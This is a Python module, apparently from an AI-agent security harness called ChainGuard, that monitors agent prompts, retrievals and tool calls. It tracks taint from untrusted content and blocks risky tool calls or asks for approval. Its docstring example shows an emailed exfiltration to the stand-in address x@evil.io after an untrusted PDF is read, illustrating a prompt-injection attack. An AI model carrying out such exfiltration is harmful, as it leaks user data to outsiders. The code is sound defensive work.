"""Harness integration: emit events at hook points, enforce verdicts.

    guard = ChainGuard(engine, session_id="s1", agent_id="triage-agent")
    guard.on_prompt("summarize this pdf", trust="user")
    guard.on_retrieval(pdf_text, source="upload:invoice.pdf", trust="untrusted")
    guard.pre_tool_call("send_email", {"to": "x@evil.io", "body": ...}, dest="x@evil.io", external=True)
        -> raises ToolBlocked / ApprovalRequired, or returns the Verdict

Or wrap tools directly:

    @guard.tool(external_dest=lambda args: args["to"])
    def send_email(to, body): ...

Tool calls are also expressed as the classic event they are about to cause
(`run_shell` -> process.start, `http_post` -> net.flow + net.http + net.dns,
`write_file` -> file.create), linked to the tool call by a provenance edge so
the session's taint carries over. Every rule in the corpus then applies to
agent actions. When any of them fires, an `ai.detection` event follows, so a
rule can say "corpus hit while tainted by untrusted content -> block".
"""
from __future__ import annotations

import functools
import time
from typing import Any, Callable

from .bridge import ToolBridge
from .engine import Engine
from .rules import SEVERITY_RANK
from .schema import Event, Span, ToolCall, Trust
from .verdict import Verdict


class ToolBlocked(PermissionError):
    def __init__(self, verdict: Verdict) -> None:
        super().__init__(verdict.explain())
        self.verdict = verdict


class ApprovalRequired(PermissionError):
    def __init__(self, verdict: Verdict) -> None:
        super().__init__(verdict.explain())
        self.verdict = verdict


class ChainGuard:
    def __init__(
        self,
        engine: Engine,
        session_id: str,
        agent_id: str | None = None,
        user: str | None = None,
        on_verdict: Callable[[Verdict], None] | None = None,
        enforce: bool = True,
        host: str | None = None,
        platform: str | None = None,        # windows | linux | macos where the agent's tools run; default: this host
        bridge: ToolBridge | None = None,   # None = default mappings; ToolBridge(defaults=False) = off
    ) -> None:
        self.engine = engine
        self.session_id = session_id
        self.agent_id = agent_id
        self.user = user
        self.host = host
        self.on_verdict = on_verdict
        self.enforce = enforce
        self.bridge = bridge if bridge is not None else ToolBridge(platform=platform)
        self._step = 0

    def _emit(self, type_: str, **kw: Any) -> Verdict:
        verdict, _ = self._emit_event(type_, **kw)
        return verdict

    def _emit_event(self, type_: str, **kw: Any) -> tuple[Verdict, Event]:
        self._step += 1
        ev = Event(type=type_, session_id=self.session_id, agent_id=self.agent_id,
                   user=self.user, host=self.host, step=self._step, **kw)
        verdict = self.engine.evaluate(ev)
        if self.on_verdict and verdict.hits:
            self.on_verdict(verdict)
        return verdict, ev

    def tick(self, now: float | None = None) -> list[Verdict]:
        """Advance the clock: returns verdicts for "not followed by" rules whose time ran out.

        Call it periodically (or before each hook). These verdicts are never raised:
        the action they describe is already over, so they're for alerting only.
        """
        verdicts = self.engine.advance_time(time.time() if now is None else now)
        if self.on_verdict:
            for v in verdicts:
                self.on_verdict(v)
        return verdicts

    def _span(self, text: str, source: str, trust: Trust | str) -> list[Span]:
        return [Span(text=text, source=source, trust=Trust.parse(trust))]

    # --------------------------------------------------------------- hook points
    def on_prompt(self, text: str, trust: Trust | str = "user", source: str = "user") -> Verdict:
        return self._emit("ai.prompt", spans=self._span(text, source, trust))

    def on_retrieval(self, text: str, source: str, trust: Trust | str = "untrusted") -> Verdict:
        return self._emit("ai.retrieval", spans=self._span(text, source, trust))

    def on_tool_result(self, tool: str, text: str, trust: Trust | str = "untrusted") -> Verdict:
        return self._emit("ai.tool_result", spans=self._span(text, f"tool:{tool}", trust))

    def on_memory_write(self, text: str) -> Verdict:
        return self._emit("ai.memory_write", spans=self._span(text, "agent", "system"))

    def on_output(self, text: str) -> Verdict:
        return self._emit("ai.output", spans=self._span(text, "agent", "system"))

    def pre_tool_call(self, name: str, args: dict[str, Any], dest: str | None = None,
                      external: bool = False) -> Verdict:
        """Check a tool call before it runs. The verdict merges the hits on the ai.tool_call
        event, on the classic events the bridge derives from it, and on the ai.detection
        event that follows a corpus hit. Raises ToolBlocked / ApprovalRequired when enforcing."""
        bridged = self.bridge.events(name, args)
        call_artifact = f"toolcall:{self.session_id}:{self._step + 1}"
        verdict, call_ev = self._emit_event(
            "ai.tool_call", tool=ToolCall(name=name, args=args, dest=dest, dest_external=external),
            fields={"trust": "system"}, outputs=[call_artifact] if bridged else [])

        classic_hits = []
        for spec in bridged:
            spec = dict(spec)
            spec.setdefault("fields", {})
            spec["fields"].setdefault("trust", "system")
            spec["inputs"] = list(spec.get("inputs", [])) + [call_artifact]
            v, _ = self._emit_event(spec.pop("type"), **spec)
            classic_hits += v.hits
        verdict.hits += classic_hits

        if classic_hits:
            worst = max((h.severity for h in classic_hits), key=SEVERITY_RANK.__getitem__)
            det, _ = self._emit_event("ai.detection", inputs=[call_artifact], fields={
                "trust": "system", "tool": name, "rules": sorted({h.rule_id for h in classic_hits}),
                "titles": [h.title for h in classic_hits][:10], "max_severity": worst,
                "sources": sorted({h.rule_id.split("_", 1)[0] for h in classic_hits})})
            verdict.hits += det.hits

        if self.enforce:
            if verdict.blocked:
                raise ToolBlocked(verdict)
            if verdict.needs_approval:
                raise ApprovalRequired(verdict)
        return verdict

    # --------------------------------------------------------------- decorator
    def tool(self, name: str | None = None, external_dest: Callable[[dict], str | None] | None = None,
             is_external: Callable[[str | None], bool] = lambda d: d is not None):
        def deco(fn):
            tool_name = name or fn.__name__

            @functools.wraps(fn)
            def wrapper(**kwargs):
                dest = external_dest(kwargs) if external_dest else None
                self.pre_tool_call(tool_name, kwargs, dest=dest, external=is_external(dest))
                result = fn(**kwargs)
                self.on_tool_result(tool_name, str(result))
                return result

            return wrapper

        return deco
